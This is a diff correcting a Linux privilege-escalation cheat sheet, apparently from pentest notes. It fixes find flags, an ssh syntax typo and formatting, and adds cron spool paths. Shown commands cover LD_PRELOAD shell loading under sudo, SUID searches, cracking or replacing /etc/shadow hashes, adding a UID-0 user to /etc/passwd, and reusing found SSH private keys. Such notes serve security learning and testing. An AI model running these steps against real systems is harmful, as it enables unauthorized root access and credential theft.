@@ -119,7 +119,7 @@ sudo LD_PRELOAD=/path/to/shell.so apache2
 After running `sudo -l` if `env_keep+=LD_LIBRARY_PATH` a malicious script can be created and run
 
 {% code title="library_path.c" %}
-```bash
+```c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -169,7 +169,8 @@ sudo -V
 ### SUID / SGID
 
 ```bash
-find / -type f perm -u=s 2>/dev/null
+find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -u=s 2>/dev/null
 # Search for both SUID and SGID files
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
 ```
@@ -260,10 +261,8 @@ getcap -r / 2>/dev/null
 ```bash
 # Verify permissions
 ls -la /etc/shadow
-
 # If the file is readable, hash cracking can be attempted
 john/hashcat
-
 # If the file is writable, the root user's password hash can be replaced
 mkpasswd -m sha-512 newpassword  # Generate new password hash.
 # Backup shadow file and replace root user password hash with the new one
@@ -274,10 +273,8 @@ mkpasswd -m sha-512 newpassword  # Generate new password hash.
 ```bash
 # Verify permissions
 ls -la /etc/passwd
-
 # If the file is writable, replace the second field with a hash overriding shadow
 openssl passwd "password"  # Generate new passowrd hash.
-
 # If the file can only be appeneded to, create new user with root user ID (0)
 newroot:<password-hash>:0:0:root:/root:/bin/bash
 ```
@@ -286,7 +283,7 @@ newroot:<password-hash>:0:0:root:/root:/bin/bash
 
 ```bash
 # There may be insecure backups of sensitive files
-# Common places are the / (root> directory, /tmp, and /var/backups
+# Common places are the / (root) directory, /tmp, and /var/backups
 # Verify root login
 grep PermitRootLogin /etc/ssh/sshd_config  # Look for 'PermitRootLogin yes'
 ```
@@ -312,7 +309,7 @@ find / -name authorized_keys 2>/dev/null
 find / -name id_rsa 2>/dev/null
 # If an id_rsa file is found, it can be copied that locally and try to use to SSH in
 chmod 600 id_rsa
-ssh -i id_rsa <user>:<IP>
+ssh -i id_rsa <user>@<IP>
 # Generate new SSH keys
 ssh-keygen
 ```
@@ -320,6 +317,10 @@ ssh-keygen
 ### Cron Jobs
 
 ```bash
+# User crontabs
+/var/spool/cron
+/var/spool/cron/crontabs
+# System crontab
 cat /etc/crontab
 # Systemd timers
 systemctl list-timers -all
